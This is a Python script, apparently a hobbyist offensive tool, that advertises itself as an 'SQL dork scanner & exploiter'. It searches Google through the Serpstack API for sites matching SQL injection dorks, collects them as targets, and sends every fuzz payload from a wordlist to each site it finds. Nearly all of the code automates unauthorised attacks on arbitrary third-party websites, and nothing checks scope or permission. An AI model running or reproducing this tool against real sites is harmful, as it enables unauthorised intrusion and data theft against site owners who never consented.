# Modules
from colorama import Fore, Back, Style
import requests
import json
import random
import time

# Keys
api_key="API KEY"
base_url=f"http://api.serpstack.com/search?access_key={api_key}&engine=google&device=desktop&page=1&num=5&output=json&query="

# Banner
banner='''
   _____ ____    __    _         _           __            
  / ___// __ \  / /   (_)___    (_)__  _____/ /_____  _____
  \__ \/ / / / / /   / / __ \  / / _ \/ ___/ __/ __ \/ ___/
 ___/ / /_/ / / /___/ / / / / / /  __/ /__/ /_/ /_/ / /    
/____/\___\_\/_____/_/_/ /_/_/ /\___/\___/\__/\____/_/     
                          /___/                            @version 1.0.0
'''
print(Fore.RED +banner)
print(Fore.WHITE+"="*60)
print(Fore.WHITE+f"\t[+] Created by","anukulpandey","[+] ")
print("\t[!] TOOL : SQL dork scanner & exploiter [!]")
print("\tSQLi vulnerable websites lookup")
print(Fore.WHITE+"="*60)

# Constants
sqli_dorks=[]
sqli_fuzz=[]
sqli_targets=[]
sqli_dorks_random=[]

# Functions
def findeq(st):
    c=0
    for i in st[::-1]:
        if(i=='='):
            return c
        c+=1 
    return st.__len__()

# Setting up Fuzzer and dorks
with open('sqli_fuzz.txt','r') as win:
    win_fuzz=win.read()
    for fuzz in win_fuzz.split():
        sqli_fuzz.append(fuzz)
    print(Fore.GREEN+f'[!] LOADED {Fore.BLUE}{sqli_fuzz.__len__()}{Fore.GREEN} PAYLOADS')

with open('sqli_dork.txt','r') as f:
    data = f.read()
    for dork in data.split():
        sqli_dorks.append(dork)
    print(f'[!] LOADED {sqli_dorks.__len__()} DORKS')
    while sqli_dorks_random.__len__()!=3:
        r=random.randint(0,72)
        if sqli_dorks[r] not in sqli_dorks_random:
            sqli_dorks_random.append(sqli_dorks[r])
            
# Main logic starts here
def google_search(query):
    print(Fore.WHITE+f'[.]Searching dork {query}                                           ',end='\r')
    res=requests.get(base_url+query)
    res_dict=json.loads(res._content.decode('utf-8'))
    with open('targets.txt','a') as f:
        for d in res_dict['organic_results']:
            f.write(f"{d['url']}\n")
            sqli_targets.append(d['url'])

def dork_runner():
    for dork in sqli_dorks_random:
        google_search(dork)
    print(Fore.GREEN+'[!] Found potentially vulnerable targets')
    time.sleep(3)


def lfi_scanner(target):
    print(Fore.WHITE+'[~] Running vulnerability scan against :',target)
    temp_chars=0
    print(Fore.BLUE+'*'*40)
    end=target.__len__()-findeq(target)
    target=target[0:end]
    for fuzz in sqli_fuzz:
        print(Fore.WHITE+f'FUZZING {fuzz}',end='\r')
        try:
            temp_res=requests.get(f'{target}{fuzz}')
            if(temp_res.status_code!=404):
                if(temp_res._content.__len__()!=temp_chars):
                    temp_chars=temp_res._content.__len__()
                    print(f'[+] Status Code : {temp_res.status_code}   [%] URL: {target}{fuzz}')
        except Exception as e:
            pass 
    print(Fore.BLUE+'*'*40)

def run_scanner():
    dork_runner()
    for target in sqli_targets:
        lfi_scanner(target)

run_scanner()
